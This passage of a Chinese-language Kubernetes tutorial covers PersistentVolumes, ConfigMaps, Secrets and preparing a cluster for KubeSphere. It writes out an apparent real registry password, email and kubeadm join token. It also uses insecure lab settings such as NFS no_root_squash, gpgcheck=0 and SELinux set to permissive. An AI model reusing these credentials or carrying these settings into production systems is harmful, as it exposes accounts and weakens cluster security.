<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv01-10m</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">10M</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">nfs</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs/data/01</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv02-1gi</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">nfs</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs/data/02</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv03-3gi</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">3Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">nfs</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs/data/03</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>

<h5 id="②-PVC创建与绑定"><a href="#②-PVC创建与绑定" class="headerlink" title="②. PVC创建与绑定"></a>②. PVC创建与绑定</h5><p><code>创建PVC</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-pvc</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">200Mi</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">nfs</span></span><br></pre></td></tr></table></figure>

<p><code>创建Pod绑定PVC</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-deploy-pvc</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deploy-pvc</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-deploy-pvc</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-deploy-pvc</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">          <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">            <span class="attr">claimName:</span> <span class="string">nginx-pvc</span></span><br></pre></td></tr></table></figure>

<h4 id="2-ConfigMap"><a href="#2-ConfigMap" class="headerlink" title="2.ConfigMap"></a>2.ConfigMap</h4><p><code>抽取应用配置，并且可以自动更新</code></p>
<h5 id="①redis示例"><a href="#①redis示例" class="headerlink" title="①redis示例"></a>①redis示例</h5><h6 id="Ⅰ把之前的配置文件创建为配置集"><a href="#Ⅰ把之前的配置文件创建为配置集" class="headerlink" title="Ⅰ把之前的配置文件创建为配置集"></a>Ⅰ把之前的配置文件创建为配置集</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建配置，redis保存到k8s的etcd；</span></span><br><span class="line">kubectl create cm redis-conf --from-file=redis.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span>    <span class="comment">#data是所有真正的数据，key：默认是文件名   value：配置文件的内容</span></span><br><span class="line">  <span class="attr">redis.conf:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    appendonly yes</span></span><br><span class="line"><span class="string"></span><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis-conf</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br></pre></td></tr></table></figure>

<h6 id="Ⅱ创建Pod"><a href="#Ⅱ创建Pod" class="headerlink" title="Ⅱ创建Pod"></a>Ⅱ创建Pod</h6><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis-server</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/redis-master/redis.conf&quot;</span>  <span class="comment">#指的是redis容器内部的位置</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/data</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">data</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/redis-master</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">data</span></span><br><span class="line">      <span class="attr">emptyDir:</span> &#123;&#125;</span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">configMap:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">redis-conf</span></span><br><span class="line">        <span class="attr">items:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">redis.conf</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">redis.conf</span></span><br></pre></td></tr></table></figure>

<h6 id="Ⅲ检查默认配置"><a href="#Ⅲ检查默认配置" class="headerlink" title="Ⅲ检查默认配置"></a>Ⅲ检查默认配置</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it redis -- redis-cli</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET appendonly</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET requirepass</span><br></pre></td></tr></table></figure>

<h6 id="Ⅳ修改ConfigMap"><a href="#Ⅳ修改ConfigMap" class="headerlink" title="Ⅳ修改ConfigMap"></a>Ⅳ修改ConfigMap</h6><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example-redis-config</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">redis-config:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    maxmemory 2mb</span></span><br><span class="line"><span class="string">    maxmemory-policy allkeys-lru </span></span><br></pre></td></tr></table></figure>

<h6 id="Ⅴ检查配置是否更新"><a href="#Ⅴ检查配置是否更新" class="headerlink" title="Ⅴ检查配置是否更新"></a>Ⅴ检查配置是否更新</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it redis -- redis-cli</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET maxmemory</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET maxmemory-policy</span><br></pre></td></tr></table></figure>

<p><code>检查指定文件内容是否已经更新</code></p>
<p><code>修改了CM。Pod里面的配置文件会跟着变</code></p>
<p><strong>配置值未更改，因为需要重新启动 Pod 才能从关联的 ConfigMap 中获取更新的值。</strong> </p>
<p><strong>原因：我们的Pod部署的中间件自己本身没有热更新能力</strong></p>
<h4 id="3-Secret"><a href="#3-Secret" class="headerlink" title="3.Secret"></a>3.Secret</h4><p><code>Secret 对象类型用来保存敏感信息，例如密码、OAuth 令牌和 SSH 密钥。 将这些信息放在 secret 中比放在</code> <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> <code>的定义或者</code> <a href="https://kubernetes.io/zh/docs/reference/glossary/?all=true#term-image">容器镜像</a> <code>中来说更加安全和灵活。</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl create secret docker-registry leifengyang-docker \</span><br><span class="line">--docker-username=leifengyang \</span><br><span class="line">--docker-password=Lfy123456 \</span><br><span class="line">--docker-email=534096094@qq.com</span><br><span class="line"></span><br><span class="line"><span class="comment">##命令格式</span></span><br><span class="line">kubectl create secret docker-registry regcred \</span><br><span class="line">  --docker-server=&lt;你的镜像仓库服务器&gt; \</span><br><span class="line">  --docker-username=&lt;你的用户名&gt; \</span><br><span class="line">  --docker-password=&lt;你的密码&gt; \</span><br><span class="line">  --docker-email=&lt;你的邮箱地址&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">private-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">private-nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">leifengyang/guignginx:v1.0</span></span><br><span class="line">  <span class="attr">imagePullSecrets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">leifengyang-docker</span></span><br></pre></td></tr></table></figure>

<h1 id="KuberSphere平台安装"><a href="#KuberSphere平台安装" class="headerlink" title="KuberSphere平台安装"></a>KuberSphere平台安装</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631263739537-5f4ea079-bdd1-498d-a0bb-4354ad23768c.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_36,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<p><a href="https://kubesphere.com.cn/">https://kubesphere.com.cn/</a></p>
<h2 id="Kubernetes上安装Kubesphere"><a href="#Kubernetes上安装Kubesphere" class="headerlink" title="Kubernetes上安装Kubesphere"></a>Kubernetes上安装Kubesphere</h2><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ul>
<li><p>选择4核8G（master）、8核16G（node1）、8核16G（node2） 三台机器，按量付费进行实验，CentOS7.9</p>
</li>
<li><p>安装Docker</p>
</li>
<li><p>安装Kubernetes</p>
</li>
<li><p>安装KubeSphere前置环境</p>
</li>
<li><p>安装KubeSphere</p>
</li>
</ul>
<h4 id="一-安装Docker"><a href="#一-安装Docker" class="headerlink" title="一.安装Docker"></a>一.安装Docker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum remove docker*</span><br><span class="line"><span class="built_in">sudo</span> yum install -y yum-utils</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置docker的yum地址</span></span><br><span class="line"><span class="built_in">sudo</span> yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装指定版本</span></span><br><span class="line"><span class="built_in">sudo</span> yum install -y docker-ce-20.10.7 docker-ce-cli-20.10.7 containerd.io-1.4.6</span><br><span class="line"></span><br><span class="line"><span class="comment">#	启动&amp;开机启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker --now</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker加速配置</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://82m9ar63.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;storage-driver&quot;</span>: <span class="string">&quot;overlay2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>

<h4 id="二-安装kubernetes"><a href="#二-安装kubernetes" class="headerlink" title="二.安装kubernetes"></a>二.安装kubernetes</h4><h5 id="1-基本环境"><a href="#1-基本环境" class="headerlink" title="1.基本环境"></a>1.基本环境</h5><p><code>每个机器使用内网ip互通</code></p>
<p><code>每个机器配置自己的hostname，不能用localhost</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置每个机器自己的hostname</span></span><br><span class="line">hostnamectl set-hostname xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 SELinux 设置为 permissive 模式（相当于将其禁用）</span></span><br><span class="line"><span class="built_in">sudo</span> setenforce 0</span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27;</span> /etc/selinux/config</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭swap</span></span><br><span class="line">swapoff -a  </span><br><span class="line">sed -ri <span class="string">&#x27;s/.*swap.*/#&amp;/&#x27;</span> /etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment">#允许 iptables 检查桥接流量</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | sudo tee /etc/modules-load.d/k8s.conf</span></span><br><span class="line"><span class="string">br_netfilter</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | sudo tee /etc/sysctl.d/k8s.conf</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> sysctl --system</span><br></pre></td></tr></table></figure>

<h5 id="2-安装kubelet-kubeadm-kubectl-1"><a href="#2-安装kubelet-kubeadm-kubectl-1" class="headerlink" title="2.安装kubelet.kubeadm.kubectl"></a>2.安装kubelet.kubeadm.kubectl</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置k8s的yum源地址</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | sudo tee /etc/yum.repos.d/kubernetes.repo</span></span><br><span class="line"><span class="string">[kubernetes]</span></span><br><span class="line"><span class="string">name=Kubernetes</span></span><br><span class="line"><span class="string">baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">gpgcheck=0</span></span><br><span class="line"><span class="string">repo_gpgcheck=0</span></span><br><span class="line"><span class="string">gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span></span><br><span class="line"><span class="string">   http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 kubelet，kubeadm，kubectl</span></span><br><span class="line"><span class="built_in">sudo</span> yum install -y kubelet-1.20.9 kubeadm-1.20.9 kubectl-1.20.9</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动kubelet</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now kubelet</span><br><span class="line"></span><br><span class="line"><span class="comment">#所有机器配置master域名</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;172.31.0.4  k8s-master&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<h5 id="3-初始化master节点"><a href="#3-初始化master节点" class="headerlink" title="3.初始化master节点"></a>3.初始化master节点</h5><h6 id="①初始化"><a href="#①初始化" class="headerlink" title="①初始化"></a>①初始化</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=172.31.0.4 \</span><br><span class="line">--control-plane-endpoint=k8s-master \</span><br><span class="line">--image-repository registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images \</span><br><span class="line">--kubernetes-version v1.20.9 \</span><br><span class="line">--service-cidr=10.96.0.0/16 \</span><br><span class="line">--pod-network-cidr=192.168.0.0/16</span><br></pre></td></tr></table></figure>

<h6 id="②记录关键信息"><a href="#②记录关键信息" class="headerlink" title="②记录关键信息"></a>②记录关键信息</h6><p><code>记录master执行完成后的日志</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">  <span class="built_in">sudo</span> <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">  <span class="built_in">sudo</span> <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, <span class="keyword">if</span> you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">You can now <span class="built_in">join</span> any number of control-plane nodes by copying certificate authorities</span><br><span class="line">and service account keys on each node and <span class="keyword">then</span> running the following as root:</span><br><span class="line"></span><br><span class="line">  kubeadm <span class="built_in">join</span> k8s-master:6443 --token 3vckmv.lvrl05xpyftbs177 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1dc274fed24778f5c284229d9fcba44a5df11efba018f9664cf5e8ff77907240 \</span><br><span class="line">    --control-plane </span><br><span class="line"></span><br><span class="line">Then you can <span class="built_in">join</span> any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm <span class="built_in">join</span> k8s-master:6443 --token 3vckmv.lvrl05xpyftbs177 \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1dc274fed24778f5c284229d9fcba44a5df11efba018f9664cf5e8ff77907240</span><br></pre></td></tr></table></figure>

<h6 id="③安装calico"><a href="#③安装calico" class="headerlink" title="③安装calico"></a>③安装calico</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://docs.projectcalico.org/manifests/calico.yaml -O</span><br><span class="line"></span><br><span class="line">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>

<h5 id="4、加入worker节点"><a href="#4、加入worker节点" class="headerlink" title="4、加入worker节点"></a>4、加入worker节点</h5><h4 id="三-安装kubeSphere前置环境"><a href="#三-安装kubeSphere前置环境" class="headerlink" title="三.安装kubeSphere前置环境"></a>三.安装kubeSphere前置环境</h4><h5 id="1-nfs文件系统"><a href="#1-nfs文件系统" class="headerlink" title="1.nfs文件系统"></a>1.nfs文件系统</h5><h6 id="①安装nfs-server"><a href="#①安装nfs-server" class="headerlink" title="①安装nfs-server"></a>①安装nfs-server</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在每个机器。</span></span><br><span class="line">yum install -y nfs-utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在master 执行以下命令 </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/nfs/data/ *(insecure,rw,sync,no_root_squash)&quot;</span> &gt; /etc/exports</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行以下命令，启动 nfs 服务;创建共享目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在master执行</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rpcbind</span><br><span class="line">systemctl <span class="built_in">enable</span> nfs-server</span><br><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使配置生效</span></span><br><span class="line">exportfs -r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查配置是否生效</span></span><br><span class="line">exportfs</span><br></pre></td></tr></table></figure>

<h6 id="②配置nfs-lient"><a href="#②配置nfs-lient" class="headerlink" title="②配置nfs-lient"></a>②配置nfs-lient</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">showmount -e 172.31.0.4</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /nfs/data</span><br><span class="line"></span><br><span class="line">mount -t nfs 172.31.0.4:/nfs/data /nfs/data</span><br></pre></td></tr></table></figure>

<h6 id="③配置默认存储"><a href="#③配置默认存储" class="headerlink" title="③配置默认存储"></a>③配置默认存储</h6><p><code>配置动态供应的默认存储类</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 创建了一个存储类</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">storage.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">StorageClass</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-storage</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">storageclass.kubernetes.io/is-default-class:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="attr">provisioner:</span> <span class="string">k8s-sigs.io/nfs-subdir-external-provisioner</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line">  <span class="attr">archiveOnDelete:</span> <span class="string">&quot;true&quot;</span>  <span class="comment">## 删除pv的时候，pv的内容是否要备份</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/nfs-subdir-external-provisioner:v4.0.2</span></span><br><span class="line">          <span class="comment"># resources:</span></span><br><span class="line">          <span class="comment">#    limits:</span></span><br><span class="line">          <span class="comment">#      cpu: 10m</span></span><br><span class="line">          <span class="comment">#    requests:</span></span><br><span class="line">          <span class="comment">#      cpu: 10m</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-root</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/persistentvolumes</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">PROVISIONER_NAME</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">k8s-sigs.io/nfs-subdir-external-provisioner</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">NFS_SERVER</span></span><br><span class="line">              <span class="attr">value:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span> <span class="comment">## 指定自己nfs服务器地址</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">NFS_PATH</span>  </span><br><span class="line">              <span class="attr">value:</span> <span class="string">/nfs/data</span>  <span class="comment">## nfs服务器共享的目录</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nfs-client-root</span></span><br><span class="line">          <span class="attr">nfs:</span></span><br><span class="line">            <span class="attr">server:</span> <span class="number">172.31</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/nfs/data</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line"> 